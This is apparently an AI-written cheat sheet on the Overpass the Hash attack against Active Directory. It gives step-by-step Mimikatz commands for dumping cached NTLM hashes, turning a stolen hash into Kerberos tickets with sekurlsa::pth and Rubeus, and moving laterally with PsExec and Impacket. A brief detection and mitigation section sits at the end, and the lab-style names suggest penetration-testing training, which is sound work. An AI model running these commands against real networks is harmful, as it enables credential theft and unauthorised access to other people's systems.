Here's a concise **Overpass the Hash (OtH) Cheat Sheet** with conditions for success, examples, and key details:

---

### **Overpass the Hash (OtH) Cheat Sheet**  
*Convert NTLM hashes to Kerberos tickets for stealthy lateral movement.*  

---

#### **Conditions for Success**  
1. **Cached Credentials**:  
   - Target user must have authenticated to the compromised machine (credentials cached).  
2. **Kerberos Availability**:  
   - Domain must use Kerberos (default in Active Directory).  
3. **Local Admin Rights**:  
   - Attacker needs local admin on the compromised machine to dump hashes.  

---

### **Steps & Examples**  

#### **1. Dump Cached Credentials**  
*Use Mimikatz to extract NTLM hashes:*  
```powershell
privilege::debug          # Elevate to DEBUG privileges
sekurlsa::logonpasswords  # Dump cached credentials
```  
**Output**: Look for `NTLM: 369def79d8372408bf6e93364cc93075` (jen's hash).  

---

#### **2. Generate Kerberos TGT**  
*Use Mimikatz to spawn a process with the stolen hash:*  
```powershell
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```  
- A new PowerShell window opens (still shows original user via `whoami` but has jen's Kerberos tickets).  

---

#### **3. Request Kerberos Tickets**  
*Trigger TGT generation by accessing a network resource:*  
```powershell
net use \\files04          # Access SMB share
# OR
dir \\dc01.corp.com\C$     # List directory
```  
**Result**: Kerberos TGT/TGS tickets are cached.  

---

#### **4. Verify Tickets**  
```powershell
klist  # List cached Kerberos tickets
```  
**Expected Output**:  
```plaintext
Ticket 0: krbtgt/CORP.COM@CORP.COM (TGT)  
Ticket 1: cifs/files04.corp.com@CORP.COM (TGS)  
```

---

#### **5. Lateral Movement with Kerberos**  
*Use tools that leverage Kerberos authentication:*  
- **PsExec (Kerberos)**:  
  ```powershell
  .\PsExec.exe \\files04 cmd.exe  # Uses cached TGS for auth
  ```  
- **Impacket (Linux)**:  
  ```bash
  impacket-psexec -k -no-pass corp.com/jen@files04
  ```  

---

### **Key Notes**  
- **Why `whoami` Doesn’t Change**:  
  - `whoami` reflects the **process token** (original user), but Kerberos tickets are stored in the **logon session**.  
- **Alternatives to `net use`**:  
  - Any Kerberos-authenticated action: `schtasks`, `sc.exe`, or accessing shares (`dir \\dc01\admin$`).  
- **Tool Alternatives**:  
  - **Rubeus**: `Rubeus asktgt /user:jen /domain:corp.com /rc4:369def79d8372408bf6e93364cc93075 /nowrap`  

---

### **Detection & Mitigation**  
**Detection**:  
- **Event ID 4768**: Kerberos TGT requests from unexpected users.  
- **Event ID 4624**: Logon Type 3 (Network) followed by Kerberos activity.  

**Mitigation**:  
- Restrict local admin privileges.  
- Enable **AES encryption** for Kerberos (disable RC4).  
- Use **LAPS** for unique local admin passwords.  
- Monitor for `sekurlsa::pth` (Mimikatz) usage.  

---

### **References**  
- [Microsoft Kerberos Docs](https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-tickets)  
- [Mimikatz Guide](https://github.com/gentilkiwi/mimikatz/wiki)  

